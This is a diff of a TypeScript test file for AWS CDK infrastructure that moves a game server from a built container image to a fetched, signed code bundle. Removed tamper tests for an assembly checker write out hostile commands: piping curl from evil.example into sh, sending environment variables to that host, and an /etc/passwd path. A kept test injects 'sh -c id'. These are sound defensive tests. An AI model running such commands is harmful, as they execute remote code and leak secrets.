@@ -1,11 +1,13 @@
+import { spawn, spawnSync } from 'node:child_process';
 import * as fs from 'node:fs';
+import * as http from 'node:http';
 import * as os from 'node:os';
 import * as path from 'node:path';
 import * as cdk from 'aws-cdk-lib';
 import { Match, Template } from 'aws-cdk-lib/assertions';
 import { beforeAll, describe, expect, it } from 'vitest';
 import type { AppManifest } from '@stacks/manifest';
-import { AppStack, buildCsp, checkAssembly, CiStack, type EnvConfig, type EnvName } from '../src/index';
+import { AppStack, buildCsp, bundleGameServer, checkAssembly, CiStack, GAME_BOOTSTRAP_SCRIPT, GAME_BUNDLE_URL_ENV, GAME_SERVER_IMAGE, type EnvConfig, type EnvName } from '../src/index';
 
 const manifest: AppManifest = {
   slug: 'hello',
@@ -221,12 +223,6 @@ describe('AppStack realtime module', () => {
 
 describe('AppStack gameServer module', () => {
   const game: AppManifest = { ...manifest, modules: ['realtime', 'gameServer'] };
-  /** A stand-in for the image the build job saves (over 1 MB, like any real image). */
-  let tarball: string;
-  beforeAll(() => {
-    tarball = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'stacks-game-')), 'image.tar');
-    fs.writeFileSync(tarball, Buffer.alloc(1024 * 1024 + 1, 1));
-  });
   const synthGame = (envName: EnvName = 'staging', m: AppManifest = game, extra: Partial<ConstructorParameters<typeof AppStack>[1]> = {}) => {
     const app = new cdk.App({ context: { 'aws:cdk:bundling-stacks': [] } });
     const stack = new AppStack(app, {
@@ -238,7 +234,6 @@ describe('AppStack gameServer module', () => {
       appDir: path.join(repoRoot, 'apps/hello'),
       webDistPath: webDist,
       apiEntry: path.join(repoRoot, 'packages/infra/tests/fake-entry.ts'),
-      gameImageTarball: tarball,
       ...extra,
     });
     return { app, stack, template: Template.fromStack(stack) };
@@ -249,7 +244,7 @@ describe('AppStack gameServer module', () => {
       .flatMap(([, p]) => p.Properties.PolicyDocument.Statement as Array<Record<string, any>>);
   const withAction = (list: Array<Record<string, any>>, action: string) => list.filter((s) => [s.Action].flat().includes(action));
 
-  it('defines an arm64 Fargate task from the tarball image, logging to its own group, with the room server\'s environment', () => {
+  it('defines an arm64 Fargate task on the pinned Node image that fetches its game, logging to its own group, with the room server\'s environment', () => {
     const { template } = synthGame();
     template.hasResourceProperties('AWS::ECS::TaskDefinition', {
       Family: 'stacks-test-app-hello-game',
@@ -261,7 +256,9 @@ describe('AppStack gameServer module', () => {
       ContainerDefinitions: [
         Match.objectLike({
           Name: 'game',
-          Image: Match.objectLike({ 'Fn::Sub': Match.stringLikeRegexp('cdk-stktest-container-assets-.*:[0-9a-f]{64}$') }),
+          Image: GAME_SERVER_IMAGE,
+          Command: ['node', '--enable-source-maps', '-e', GAME_BOOTSTRAP_SCRIPT],
+          User: 'node',
           StopTimeout: 30,
           LogConfiguration: Match.objectLike({ LogDriver: 'awslogs', Options: Match.objectLike({ 'awslogs-stream-prefix': 'room' }) }),
         }),
@@ -328,11 +325,12 @@ describe('AppStack gameServer module', () => {
     expect(JSON.stringify(withAction(task, 'secretsmanager:GetSecretValue')[0]!.Resource)).toContain('GameKey');
     for (const s of task) expect(JSON.stringify(s.Action)).not.toMatch(/ecs:|iam:|ssm:|"\*"/);
 
-    // The execution role only pulls the image and writes logs.
+    // The task role can't read the bundle (the API hands it a signed link) or anything in S3.
+    for (const st of task) expect(JSON.stringify(st.Action)).not.toMatch(/s3:/);
+
+    // The execution role only writes logs: the image is public, there is nothing to pull from ECR.
     const exec = statements(template, /GameServerTaskExecutionRole/);
-    expect(exec.flatMap((s) => [s.Action].flat()).sort()).toEqual(
-      ['ecr:BatchCheckLayerAvailability', 'ecr:BatchGetImage', 'ecr:GetAuthorizationToken', 'ecr:GetDownloadUrlForLayer', 'logs:CreateLogStream', 'logs:PutLogEvents'].sort(),
-    );
+    expect(exec.flatMap((s) => [s.Action].flat()).sort()).toEqual(['logs:CreateLogStream', 'logs:PutLogEvents']);
   });
 
   it('lets the server connect and subscribe with IAM on the Event API; browsers still use tokens', () => {
@@ -379,7 +377,7 @@ describe('AppStack gameServer module', () => {
     expect(resources).toContain('parameter/stacks/test/secrets/platform/CLOUDFLARE_TURN_KEY_ID');
     expect(resources).toContain('parameter/stacks/test/secrets/platform/CLOUDFLARE_TURN_API_TOKEN');
     expect(resources).not.toContain('platform/*');
-    expect(withAction(api, 'kms:Decrypt')[0]!.Condition).toEqual({ StringEquals: { 'kms:ViaService': 'ssm.us-east-1.amazonaws.com' } });
+    expect(withAction(api, 'kms:Decrypt').map((st) => st.Condition)).toContainEqual({ StringEquals: { 'kms:ViaService': 'ssm.us-east-1.amazonaws.com' } });
   });
 
   it('tells the API Lambda where to run tasks', () => {
@@ -452,27 +450,99 @@ describe('AppStack gameServer module', () => {
     expect(() => synthGame('staging', { ...manifest, modules: ['gameServer'] })).toThrow(/needs "realtime"/);
   });
 
-  describe('the image', () => {
-    it('synthesizes with a placeholder (and a warning) when no image was built, but deploy builds refuse', () => {
-      const missing = path.join(os.tmpdir(), 'stacks-no-such-image.tar');
-      const { app, stack } = synthGame('staging', game, { gameImageTarball: missing });
-      const warnings = app.synth().getStackByName(stack.stackName).messages.filter((m) => m.level === 'warning');
-      expect(JSON.stringify(warnings)).toMatch(/placeholder\. Do not deploy/);
-      // The staging gate turns a placeholder away.
-      expect(checkAssemblyProblems(app).join()).toMatch(/is not a built image/);
-      expect(() => synthGame('staging', game, { gameImageTarball: missing, requireGameImage: true })).toThrow(/no game server image.*build-game-images -- hello/);
+  describe('the game bundle', () => {
+    it('is a single-file asset, and the API may read that one object to sign links to it', () => {
+      const { template, app } = synthGame();
+      const api = statements(template, /ApiHandlerServiceRole/);
+      const reads = withAction(api, 's3:GetObject');
+      expect(reads).toHaveLength(1);
+      // Exactly the bundle's key in the bootstrap's asset bucket: no wildcard over every app's code.
+      const resource = JSON.stringify(reads[0]!.Resource);
+      expect(resource).toContain('cdk-stktest-assets');
+      // (`.mjs` in a real synth; these tests skip bundling, which stages the game folder as a zip.)
+      expect(resource).toMatch(/\/[0-9a-f]{64}\.(mjs|zip)"/);
+      expect(resource).not.toContain('/*');
+      expect(withAction(api, 's3:GetObject*')).toEqual([]);
+      expect(JSON.stringify(withAction(api, 's3:PutObject'))).toBe('[]');
+      expect(withAction(api, 'kms:Decrypt').map((s) => s.Condition)).toContainEqual({ StringEquals: { 'kms:ViaService': 's3.us-east-1.amazonaws.com' } });
+      template.hasResourceProperties('AWS::Lambda::Function', {
+        Environment: { Variables: Match.objectLike({ STACKS_GAME_BUNDLE_BUCKET: Match.anyValue(), STACKS_GAME_BUNDLE_KEY: Match.anyValue() }) },
+      });
+      const assets = JSON.parse(fs.readFileSync(path.join(app.synth().directory, 'stacks-test-app-hello.assets.json'), 'utf8'));
+      expect(assets.dockerImages ?? {}).toEqual({});
     });
 
-    it('goes into the assembly as a tarball the deploy job only loads and pushes', () => {
-      const { app } = synthGame();
-      const dir = app.synth().directory;
-      const assets = JSON.parse(fs.readFileSync(path.join(dir, 'stacks-test-app-hello.assets.json'), 'utf8'));
-      const images = Object.values(assets.dockerImages) as { source: { executable: string[]; directory?: string } }[];
-      expect(images).toHaveLength(1);
-      expect(images[0]!.source.directory).toBeUndefined();
-      expect(images[0]!.source.executable.slice(0, 2)).toEqual(['sh', '-c']);
-      expect(images[0]!.source.executable[2]).toMatch(/^docker load -i "\$1"/);
-      expect(fs.existsSync(path.join(dir, images[0]!.source.executable[4]!))).toBe(true);
+    it('bundles a real game into one runnable module (it starts, and asks for its room)', () => {
+      const out = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'stacks-bundle-')), 'server.mjs');
+      bundleGameServer({ repoRoot, appDir: path.join(repoRoot, 'apps/hello'), outfile: out });
+      const size = fs.statSync(out).size;
+      expect(size).toBeGreaterThan(100_000);
+      expect(size).toBeLessThan(6_000_000);
+      // Deterministic: the same sources give the same bytes, so the asset hash (and upload) is stable.
+      const again = path.join(path.dirname(out), 'again.mjs');
+      bundleGameServer({ repoRoot, appDir: path.join(repoRoot, 'apps/hello'), outfile: again });
+      expect(fs.readFileSync(again).equals(fs.readFileSync(out))).toBe(true);
+      // Runs as is under Node, and stops at the first thing only a real task has.
+      const run = spawnSync(process.execPath, [out], { encoding: 'utf8', env: { PATH: process.env.PATH }, timeout: 20_000 });
+      expect(run.status).toBe(1);
+      expect(run.stderr).toContain('Missing required environment variable STACKS_ROOM_ID');
+    });
+
+    it('names the app when its game/server.ts is missing', () => {
+      const appDir = fs.mkdtempSync(path.join(os.tmpdir(), 'stacks-nogame-'));
+      expect(() => bundleGameServer({ repoRoot, appDir, outfile: path.join(appDir, 'x.mjs') })).toThrow(/no game\/server\.ts/);
+    });
+  });
+
+  describe('the start script', () => {
+    /** Serve `body` (or a status) on a local port, as S3 would through the signed link. */
+    const serve = (respond: (n: number) => { status: number; body?: string }) =>
+      new Promise<{ url: string; hits: () => number; close: () => void }>((resolve) => {
+        let hits = 0;
+        const server = http.createServer((_req, res) => {
+          const r = respond(++hits);
+          res.writeHead(r.status).end(r.body ?? '');
+        });
+        server.listen(0, '127.0.0.1', () => resolve({ url: `http://127.0.0.1:${(server.address() as { port: number }).port}/bundle.mjs`, hits: () => hits, close: () => server.close() }));
+      });
+    const runScript = (env: Record<string, string>) =>
+      new Promise<{ status: number | null; stdout: string; stderr: string }>((resolve) => {
+        const child = spawn(process.execPath, ['--enable-source-maps', '-e', GAME_BOOTSTRAP_SCRIPT], { env: { PATH: process.env.PATH ?? '', ...env } });
+        let stdout = '';
+        let stderr = '';
+        child.stdout.on('data', (d) => (stdout += d));
+        child.stderr.on('data', (d) => (stderr += d));
+        child.on('close', (status) => resolve({ status, stdout, stderr }));
+      });
+
+    it('fetches the bundle from the link and runs it as an ES module', async () => {
+      const s = await serve(() => ({ status: 200, body: "import { platform } from 'node:os';\nconsole.log('game running on', platform(), typeof import.meta.url);\n" }));
+      const r = await runScript({ [GAME_BUNDLE_URL_ENV]: s.url });
+      s.close();
+      expect(r.stdout).toContain('game running on');
+      expect(r.stdout).toContain('string');
+      expect(r.status).toBe(0);
+    });
+
+    it('retries a failed fetch, and fails the task after four tries', async () => {
+      const flaky = await serve((n) => (n < 3 ? { status: 503 } : { status: 200, body: "console.log('third time lucky')" }));
+      const ok = await runScript({ [GAME_BUNDLE_URL_ENV]: flaky.url });
+      flaky.close();
+      expect(ok.stdout).toContain('third time lucky');
+      expect(flaky.hits()).toBe(3);
+
+      const down = await serve(() => ({ status: 403 }));
+      const failed = await runScript({ [GAME_BUNDLE_URL_ENV]: down.url });
+      down.close();
+      expect(failed.status).toBe(1);
+      expect(failed.stderr).toContain('Could not fetch the game bundle');
+      expect(down.hits()).toBe(4);
+    }, 20_000);
+
+    it('refuses to start without a link (a task started by hand)', async () => {
+      const r = await runScript({});
+      expect(r.status).toBe(1);
+      expect(r.stderr).toContain(`No ${GAME_BUNDLE_URL_ENV}`);
     });
   });
 
@@ -486,18 +556,11 @@ describe('AppStack gameServer module', () => {
       fs.writeFileSync(file, JSON.stringify(assets));
       return checkAssembly(dir, 'stacks-test-app-hello');
     };
-    const image = (assets: any) => Object.values(assets.dockerImages)[0] as { source: Record<string, unknown> };
 
-    it('refuses an image that would be built at deploy time', () => {
-      expect(tamper((a) => (image(a).source = { directory: 'asset.x' })).join()).toMatch(/never built from a directory/);
-    });
-    it('refuses any other command in place of the tarball load', () => {
-      expect(tamper((a) => ((image(a).source.executable as string[])[2] = 'curl https://evil.example | sh')).join()).toMatch(/unexpected load command/);
-      expect(tamper((a) => (image(a).source.executable = ['sh', '-c', 'docker load -i "$1"; env | curl -d @- https://evil.example', 'x', 'asset.tar'])).join()).toMatch(/unexpected load command/);
-      expect(tamper((a) => ((image(a).source.executable as string[])[4] = '../../etc/passwd')).join()).toMatch(/unexpected load command/);
-    });
-    it('refuses a tarball that is not in the assembly', () => {
-      expect(tamper((a) => ((image(a).source.executable as string[])[4] = `asset.${'0'.repeat(64)}.tar`)).join()).toMatch(/is not in the assembly/);
+    it('refuses any container image (app stacks have none)', () => {
+      const image = { source: { executable: ['sh', '-c', 'docker load -i "$1"', 'x', 'asset.tar'] }, destinations: {} };
+      expect(tamper((a) => (a.dockerImages = { evil: image })).join()).toMatch(/app stacks have no container images/);
+      expect(tamper((a) => (a.dockerImages = { built: { source: { directory: 'asset.x' }, destinations: {} } })).join()).toMatch(/app stacks have no container images/);
     });
     it('refuses a file asset that runs a command', () => {
       expect(tamper((a) => ((Object.values(a.files)[0] as { source: Record<string, unknown> }).source = { executable: ['sh', '-c', 'id'] })).join()).toMatch(/file assets may not run a command/);
